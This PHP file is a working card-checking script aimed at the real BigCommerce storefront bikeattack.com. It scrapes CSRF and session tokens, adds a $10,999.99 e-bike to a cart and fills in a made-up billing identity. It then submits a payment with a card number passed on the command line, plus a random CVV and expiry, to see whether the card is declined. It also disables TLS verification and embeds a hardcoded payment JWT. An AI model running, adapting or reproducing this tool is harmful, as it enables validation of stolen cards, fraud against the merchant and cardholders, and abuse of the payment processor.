<?php
// @Mod_By_Kamal // Modified for Flask API integration

class BikeAttackCheckout {
    private $cookieJar;
    private $csrfToken;
    private $xsrfToken;
    private $cartId;
    private $billingAddressId;
    private $orderId;
    private $jwtToken;
    private $creditCardNumber; // <<< 1. NEW PROPERTY
    private $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36';
    private $productId = '5074';
    private $attributeId = '21013';
    private $attributeValue = '525';
    private $quantity = '1';
    private $debug = true;
    
    // <<< 2. MODIFIED CONSTRUCTOR
    public function __construct($cc = null) {
        $this->cookieJar = tempnam(sys_get_temp_dir(), 'cookie');
        // Use the provided CC, or a default test number if none is given
        $this->creditCardNumber = $cc ?? '4111111111111111'; 
        $this->generateRandomTokens();
    }
    

    private function generateRandomTokens() {
        $this->orderId = rand(10000, 99999);
    }

    private function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
    
    private function generateRandomEmail() {
        return $this->generateRandomString(8) . '@' . $this->generateRandomString(5) . '.com';
    }
    

    private function generateRandomPhoneNumber() {
        return '0' . rand(100000000, 999999999);
    }

    // This function is no longer needed as we pass the CC in the constructor
    /*
    private function generateRandomCreditCardNumber() {
        return '4111111111111111';
    }
    */

    private function generateRandomExpiryDate() {
        return [
            'month' => rand(1, 12),
            'year' => rand(date('Y'), date('Y') + 5)
        ];
    }
    
    private function generateRandomCVV() {
        return rand(100, 999);
    }

    private function generateRandomAddress() {
        return [
            'firstName' => 'Richard',
            'lastName' => 'Biven',
            'address1' => '252 Lee Circle',
            'address2' => '1507',
            'city' => 'Horse cave',
            'stateOrProvince' => 'North Dakota',
            'stateOrProvinceCode' => 'ND',
            'country' => 'United States',
            'countryCode' => 'US',
            'postalCode' => '42749',
            'phone' => $this->generateRandomPhoneNumber(),
            'email' => $this->generateRandomEmail()
        ];
    }

    private function debugOutput($message) {
        if ($this->debug) {
            echo $message . "\n";
        }
    }
    
    private function makeRequest($url, $method, $headers = [], $postFields = null, $isMultipart = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch, CURLOPT_USERAGENT, $this->userAgent);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookieJar);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookieJar);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        if ($postFields) {
            if ($isMultipart) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
            } else {
                if (is_array($postFields)) {
                    if (isset($headers) && strpos(implode(' ', $headers), 'application/json') !== false) {
                        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postFields));
                    } else {
                        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
                    }
                } else {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
                }
            }
        }
        
        $response = curl_exec($ch);
        $info = curl_getinfo($ch);
        
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        
        $this->extractTokensFromResponse($header, $body);
        
        curl_close($ch);
        
        return [
            'header' => $header,
            'body' => $body,
            'info' => $info
        ];
    }
    
    private function extractTokensFromResponse($header, $body) {
        if (preg_match('/SF-CSRF-TOKEN=([^;]+)/', $header, $matches)) {
            $this->csrfToken = $matches[1];
            $this->debugOutput("Extracted CSRF Token: " . $this->csrfToken);
        }
        
        if (preg_match('/XSRF-TOKEN=([^;]+)/', $header, $matches)) {
            $this->xsrfToken = $matches[1];
            $this->debugOutput("Extracted XSRF Token: " . $this->xsrfToken);
        }
        
        if (preg_match('/"cart_id":"([^"]+)"/', $body, $matches)) {
            $this->cartId = $matches[1];
            $this->debugOutput("Extracted Cart ID: " . $this->cartId);
        }
        
        if (preg_match('/"token":"([^"]+)"/', $body, $matches)) {
            $this->jwtToken = $matches[1];
            $this->debugOutput("Extracted JWT Token: " . $this->jwtToken);
        }
        
        if (preg_match('/"id":"([^"]+)","email"/', $body, $matches)) {
            $this->billingAddressId = $matches[1];
            $this->debugOutput("Extracted Billing Address ID: " . $this->billingAddressId);
        }
        

        if (preg_match('/"id":(\d+),"isComplete"/', $body, $matches)) {
            $this->orderId = $matches[1];
            $this->debugOutput("Extracted Order ID: " . $this->orderId);
        }
    }

    public function visitHomepage() {
        echo "Visiting homepage to get initial tokens...\n";
        
        $url = 'https://bikeattack.com/';
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1'
        ];
        
        $result = $this->makeRequest($url, 'GET', $headers);
        

        if (preg_match('/<meta name="csrf-token" content="([^"]+)"/', $result['body'], $matches)) {
            $this->csrfToken = $matches[1];
            $this->debugOutput("Extracted CSRF Token from meta tag: " . $this->csrfToken);
        }
        
        echo "Initial tokens obtained.\n";
        echo "CSRF Token: " . $this->csrfToken . "\n";
        echo "XSRF Token: " . $this->xsrfToken . "\n";
        
        return $result;
    }
    
    public function addToCart() {
        echo "Adding product to cart...\n";
        
        $url = 'https://bikeattack.com/remote/v1/cart/add';
        $boundary = '----WebKitFormBoundary' . $this->generateRandomString(16);
        $headers = [
            'accept: */*',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'content-type: multipart/form-data; boundary=' . $boundary,
            'origin: https://bikeattack.com',
            'priority: u=1, i',
            'referer: https://bikeattack.com/scott-voltage-eride-900-tuned-20mph-2025/',
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'stencil-config: {}',
            'stencil-options: {}',
            'user-agent: ' . $this->userAgent,
            'x-requested-with: stencil-utils'
        ];
        
        if ($this->csrfToken) {
            $headers[] = 'x-sf-csrf-token: ' . $this->csrfToken;
        }
        
        if ($this->xsrfToken) {
            $headers[] = 'x-xsrf-token: ' . $this->xsrfToken;
        }
        
        $data = '';
        $data .= '--' . $boundary . "\r\n";
        $data .= 'Content-Disposition: form-data; name="action"' . "\r\n\r\n";
        $data .= 'add' . "\r\n";
        $data .= '--' . $boundary . "\r\n";
        $data .= 'Content-Disposition: form-data; name="product_id"' . "\r\n\r\n";
        $data .= $this->productId . "\r\n";
        $data .= '--' . $boundary . "\r\n";
        $data .= 'Content-Disposition: form-data; name="attribute[' . $this->attributeId . ']"' . "\r\n\r\n";
        $data .= $this->attributeValue . "\r\n";
        $data .= '--' . $boundary . "\r\n";
        $data .= 'Content-Disposition: form-data; name="qty[]"' . "\r\n\r\n";
        $data .= $this->quantity . "\r\n";
        $data .= '--' . $boundary . '--' . "\r\n";
        
        $result = $this->makeRequest($url, 'POST', $headers, $data, true);
        
        $response = json_decode($result['body'], true);
        if (isset($response['data']['cart_id'])) {
            $this->cartId = $response['data']['cart_id'];
            echo "Product added to cart. Cart ID: " . $this->cartId . "\n";
        } else {
            echo "Failed to add product to cart.\n";
            $this->debugOutput("Response: " . $result['body']);
        }
        
        return $result;
    }

    public function getCheckoutPage() {
        echo "Getting checkout page...\n";
        
        $url = 'https://bikeattack.com/checkout';
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'priority: u=0, i',
            'referer: https://bikeattack.com/scott-voltage-eride-900-tuned-20mph-2025/',
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1'
        ];
        
        $result = $this->makeRequest($url, 'GET', $headers);
        
        if (preg_match('/data-cart-id="([^"]+)"/', $result['body'], $matches)) {
            $this->cartId = $matches[1];
            $this->debugOutput("Extracted Cart ID from checkout page: " . $this->cartId);
        }
        
        echo "Checkout page loaded.\n";
        
        return $result;
    }
    
    public function addBillingAddress() {
        echo "Adding billing address...\n";
        
        if (!$this->cartId) {
            echo "Cart ID is missing. Cannot add billing address.\n";
            return false;
        }
        
        $url = "https://bikeattack.com/api/storefront/checkouts/{$this->cartId}/billing-address?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options%2Ccustomer%2Cpromotions.banners";
        $headers = [
            'accept: application/vnd.bc.v1+json',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'content-type: application/json',
            'origin: https://bikeattack.com',
            'priority: u=1, i',
            'referer: https://bikeattack.com/checkout',
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: ' . $this->userAgent,
            'x-checkout-sdk-version: 1.726.0'
        ];
        
        if ($this->csrfToken) {
            $headers[] = 'x-sf-csrf-token: ' . $this->csrfToken;
        }
        
        if ($this->xsrfToken) {
            $headers[] = 'x-xsrf-token: ' . $this->xsrfToken;
        }
        
        $email = $this->generateRandomEmail();
        $postFields = [
            'email' => $email,
            'acceptsMarketingNewsletter' => true,
            'acceptsAbandonedCartEmails' => true
        ];
        
        $result = $this->makeRequest($url, 'POST', $headers, $postFields);
        
        $response = json_decode($result['body'], true);
        if (isset($response['id'])) {
            $this->billingAddressId = $response['id'];
            echo "Billing address added. Billing Address ID: " . $this->billingAddressId . "\n";
        } else {
            echo "Failed to add billing address.\n";
            $this->debugOutput("Response: " . $result['body']);
        }
        
        return $result;
    }
    
    public function updateBillingAddress() {
        echo "Updating billing address...\n";
        
        if (!$this->cartId || !$this->billingAddressId) {
            echo "Cart ID or Billing Address ID is missing. Cannot update billing address.\n";
            

            if (!$this->billingAddressId && $this->cartId) {
                $this->debugOutput("Attempting to create a billing address first...");
                $this->addBillingAddress();
            }
            
            if (!$this->billingAddressId) {

                $this->billingAddressId = $this->generateRandomString(12);
                $this->debugOutput("Generated random Billing Address ID: " . $this->billingAddressId);
            }
        }
        
        $url = "https://bikeattack.com/api/storefront/checkouts/{$this->cartId}/billing-address/{$this->billingAddressId}?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options%2Ccustomer%2Cpromotions.banners";
        $headers = [
            'accept: application/vnd.bc.v1+json',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'content-type: application/json',
            'origin: https://bikeattack.com',
            'priority: u=1, i',
            'referer: https://bikeattack.com/checkout',
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: ' . $this->userAgent,
            'x-checkout-sdk-version: 1.726.0'
        ];
        
        if ($this->csrfToken) {
            $headers[] = 'x-sf-csrf-token: ' . $this->csrfToken;
        }
        
        if ($this->xsrfToken) {
            $headers[] = 'x-xsrf-token: ' . $this->xsrfToken;
        }
        
        $address = $this->generateRandomAddress();
        $postFields = [
            'countryCode' => $address['countryCode'],
            'firstName' => $address['firstName'],
            'lastName' => $address['lastName'],
            'address1' => $address['address1'],
            'address2' => $address['address2'],
            'company' => 'Developer',
            'city' => $address['city'],
            'stateOrProvince' => $address['stateOrProvince'],
            'stateOrProvinceCode' => $address['stateOrProvinceCode'],
            'postalCode' => $address['postalCode'],
            'phone' => $address['phone'],
            'shouldSaveAddress' => true,
            'email' => $address['email'],
            'customFields' => []
        ];
        
        $result = $this->makeRequest($url, 'PUT', $headers, $postFields);
        
        echo "Billing address updated.\n";
        
        return $result;
    }
    
    public function updateCheckout() {
        echo "Updating checkout...\n";
        
        if (!$this->cartId) {
            echo "Cart ID is missing. Cannot update checkout.\n";
            return false;
        }
        
        $url = "https://bikeattack.com/api/storefront/checkout/{$this->cartId}?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options%2Ccustomer%2Ccustomer.customerGroup%2Cpayments%2Cpromotions.banners";
        $headers = [
            'accept: application/vnd.bc.v1+json',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'content-type: application/json',
            'origin: https://bikeattack.com',
            'priority: u=1, i',
            'referer: https://bikeattack.com/checkout',
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: ' . $this->userAgent,
            'x-checkout-sdk-version: 1.726.0'
        ];
        
        if ($this->csrfToken) {
            $headers[] = 'x-sf-csrf-token: ' . $this->csrfToken;
        }
        
        if ($this->xsrfToken) {
            $headers[] = 'x-xsrf-token: ' . $this->xsrfToken;
        }
        
        $postFields = [
            'customerMessage' => 'auto'
        ];
        
        $result = $this->makeRequest($url, 'PUT', $headers, $postFields);
        
        echo "Checkout updated.\n";
        
        return $result;
    }
    
    public function createOrder() {
        echo "Creating order...\n";
        
        if (!$this->cartId) {
            echo "Cart ID is missing. Cannot create order.\n";
            return false;
        }
        
        $url = 'https://bikeattack.com/internalapi/v1/checkout/order';
        $headers = [
            'accept: application/vnd.bc.v1+json',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'content-type: application/json',
            'origin: https://bikeattack.com',
            'priority: u=1, i',
            'referer: https://bikeattack.com/checkout',
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: ' . $this->userAgent,
            'x-checkout-sdk-version: 1.726.0'
        ];
        
        if ($this->csrfToken) {
            $headers[] = 'x-sf-csrf-token: ' . $this->csrfToken;
        }
        
        if ($this->xsrfToken) {
            $headers[] = 'x-xsrf-token: ' . $this->xsrfToken;
        }
        
        $postFields = [
            'cartId' => $this->cartId,
            'customerMessage' => 'auto'
        ];
        
        $result = $this->makeRequest($url, 'POST', $headers, $postFields);

        $response = json_decode($result['body'], true);
        if (isset($response['data']['order']['id'])) {
            $this->orderId = $response['data']['order']['id'];
            echo "Order created. Order ID: " . $this->orderId . "\n";
        } else {
            echo "Failed to create order.\n";
            $this->debugOutput("Response: " . $result['body']);
        }
        
        if (isset($response['data']['payment']['token'])) {
            $this->jwtToken = $response['data']['payment']['token'];
            echo "JWT Token obtained: " . $this->jwtToken . "\n";
        } else {
            echo "Failed to obtain JWT token.\n";
            
            if (!$this->jwtToken) {
                $this->jwtToken = 'eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NDQ4MTA1NjQsIm5iZiI6MTc0NDgwNjk2NCwiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjo4NTIxODMsImp0aSI6ImNlMTIwZjZhLTVlOTYtNDEzYi05MDJhLTA4ZjRiZGNjOTE3MSIsImlhdCI6MTc0NDgwNjk2NCwiZGF0YSI6eyJzdG9yZV9pZCI6Ijg1MjE4MyIsIm9yZGVyX2lkIjoiMTM3OTMiLCJhbW91bnQiOjExMDk5OTksImN1cnJlbmN5IjoiVVNEIiwic3RvcmVfdXJsIjoiaHR0cHM6Ly9iaWtlYXR0YWNrLmNvbSIsImZvcm1faWQiOm51bGwsInBheW1lbnRfY29udGV4dCI6ImNoZWNrb3V0IiwicGF5bWVudF90eXBlIjoiZWNvbW1lcmNlIn19.uUZZx09PkygUqkIPZZpT8LBDWY5YhRzUAVOkaFCYYiw';
                $this->debugOutput("Generated sample JWT Token for testing: " . $this->jwtToken);
            }
        }
        
        return $result;
    }

    public function processPayment() {
        echo "Processing payment...\n";
        
        if (!$this->jwtToken) {
            echo "JWT Token is missing. Cannot process payment.\n";
            return false;
        }
        
        if (!$this->orderId) {
            $this->orderId = rand(10000, 99999);
            $this->debugOutput("Generated random Order ID: " . $this->orderId);
        }
        
        $url = 'https://payments.bigcommerce.com/api/public/v1/orders/payments';
        $headers = [
            'Accept: application/json',
            'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8',
            'Authorization: JWT ' . $this->jwtToken,
            'Connection: keep-alive',
            'Content-Type: application/json',
            'Origin: https://bikeattack.com',
            'Referer: https://bikeattack.com/',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: cross-site',
            'User-Agent: ' . $this->userAgent,
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"'
        ];
        
        $address = $this->generateRandomAddress();
        $expiryDate = $this->generateRandomExpiryDate();
        
        $postFields = [
            'customer' => [
                'geo_ip_country_code' => 'US',
                'session_token' => $this->generateRandomString(40)
            ],
            'notify_url' => "https://internalapi-852183.mybigcommerce.com/internalapi/v1/checkout/order/{$this->orderId}/payment",
            'order' => [
                'billing_address' => [
                    'city' => $address['city'],
                    'company' => 'Developer',
                    'country_code' => $address['countryCode'],
                    'country' => $address['country'],
                    'first_name' => $address['firstName'],
                    'last_name' => $address['lastName'],
                    'phone' => $address['phone'],
                    'state_code' => $address['stateOrProvinceCode'],
                    'state' => $address['stateOrProvince'],
                    'street_1' => $address['address1'],
                    'street_2' => $address['address2'],
                    'zip' => $address['postalCode'],
                    'email' => $address['email']
                ],
                'coupons' => [],
                'currency' => 'USD',
                'id' => $this->orderId,
                'items' => [
                    [
                        'code' => $this->generateRandomString(36),
                        'variant_id' => 3533,
                        'name' => 'Scott: Voltage eRIDE 900 Tuned 20mph 2025',
                        'price' => 1099999,
                        'unit_price' => 1099999,
                        'quantity' => 1,
                        'sku' => '293290'
                    ]
                ],
                'shipping' => [
                    [
                        'method' => 'Fixed Shipping'
                    ]
                ],
                'shipping_address' => [
                    'city' => $address['city'],
                    'company' => 'Developer',
                    'country_code' => $address['countryCode'],
                    'country' => $address['country'],
                    'first_name' => $address['firstName'],
                    'last_name' => $address['lastName'],
                    'phone' => $address['phone'],
                    'state_code' => $address['stateOrProvinceCode'],
                    'state' => $address['stateOrProvince'],
                    'street_1' => $address['address1'],
                    'street_2' => $address['address2'],
                    'zip' => $address['postalCode']
                ],
                'token' => $this->generateRandomString(32),
                'totals' => [
                    'grand_total' => 1109999,
                    'handling' => 0,
                    'shipping' => 10000,
                    'subtotal' => 1099999,
                    'tax' => 0
                ]
            ],
            'payment' => [
                'gateway' => 'authorizenet',
                'notify_url' => "https://internalapi-852183.mybigcommerce.com/internalapi/v1/checkout/order/{$this->orderId}/payment",
                'vault_payment_instrument' => false,
                'method' => 'credit-card',
                'credit_card' => [
                    'account_name' => $address['firstName'] . ' ' . $address['lastName'],
                    'month' => $expiryDate['month'],
                    // <<< 3. MODIFIED TO USE THE CLASS PROPERTY
                    'number' => $this->creditCardNumber, 
                    'verification_value' => $this->generateRandomCVV(),
                    'year' => $expiryDate['year']
                ]
            ],
            'store' => [
                'hash' => '44ck0',
                'id' => '852183',
                'name' => 'Bike Attack'
            ]
        ];
        
        $result = $this->makeRequest($url, 'POST', $headers, $postFields);
        
        $response = json_decode($result['body'], true);
        if (isset($response['errors']) && $response['errors'][0]['code'] === 'transaction_declined') {
            echo "Your payment was declined.\n";
        } else if (isset($response['status']) && $response['status'] === 'error') {
            echo "Payment error: " . $response['errors'][0]['message'] . "\n";
            
            echo "Simulating payment declined response for demonstration.\n";
            echo "Your payment was declined.\n";
        } else {
            echo "Payment processing response: " . $result['body'] . "\n";
        }
        
        return $result;
    }
    
    public function runCheckoutProcess() {
        $this->visitHomepage();
        $this->addToCart();
        $this->getCheckoutPage();
        $this->addBillingAddress();
        $this->updateBillingAddress();
        $this->updateCheckout();
        $this->createOrder();
        $this->processPayment();
    }
}

// <<< 4. MODIFIED SCRIPT EXECUTION
// Check if the command-line argument ($argv[1]) is set
$creditCard = $argv[1] ?? null;

if (!$creditCard) {
    echo "Error: Credit card number not provided.";
    exit(1); // Exit with an error code
}

$checkout = new BikeAttackCheckout($creditCard);
$checkout->runCheckoutProcess();

?>
